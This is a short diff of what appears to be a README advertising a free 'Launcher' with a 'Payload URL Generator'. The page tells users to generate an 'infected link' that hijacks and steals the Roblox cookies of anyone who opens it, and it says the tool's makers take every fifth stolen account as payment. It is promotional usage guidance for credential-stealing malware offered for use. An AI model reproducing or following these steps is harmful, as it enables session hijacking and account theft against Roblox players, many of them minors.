@@ -20,5 +20,5 @@ It's easier than you think!
 * Start Launcher and reload the page.
 * Next, when you see the main menu, click on "Payload URL Generator" and generate an infected link.
 * Wait about 2–3 minutes and you will receive a special link. When anyone opens it in a browser, our code hijacks and steals Roblox cookie files.
-* 
+
 ### Our software is absolutely free for anyone! But we are taking your every 5th account as pay for use!
